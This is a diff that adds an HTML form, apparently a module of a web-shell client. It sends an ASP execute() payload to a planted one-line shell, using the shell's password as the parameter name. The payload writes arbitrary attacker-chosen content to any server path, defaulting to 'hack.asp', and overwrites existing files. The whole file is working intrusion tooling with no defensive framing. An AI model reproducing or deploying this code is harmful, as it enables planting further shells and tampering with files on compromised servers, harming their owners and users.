@@ -1,0 +1,22 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">Upload TextFile <br>
+upload file will overwrite the exist file.
+</div>
+<form method="post" name="xform" target="_blank">
+  <p>
+  Path: 
+  <input name="path" type="text" value="f:\hack.asp" size="40">
+  <br>
+  The TextFile Content:<br>
+  <textarea name="lake2" cols="50" rows="15" id="lake2">Enjoy Hacking!</textarea>
+  <br>
+  <input type="hidden" name="code" value='execute("response.clear:thePath=request(""path""):set lP=server.createObject(""Adodb.Stream""):lP.Open:lP.Type=2:lP.CharSet=""gb2312"":lP.writetext request(""lake2""):lP.SaveToFile thePath,2:lP.Close:set lP=nothing:response.write(""Save to <b>""&thePath&""</b> Success !""):response.end")'> 
+  </p>
+</form>
+<script>
+function RUNonclick(){
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
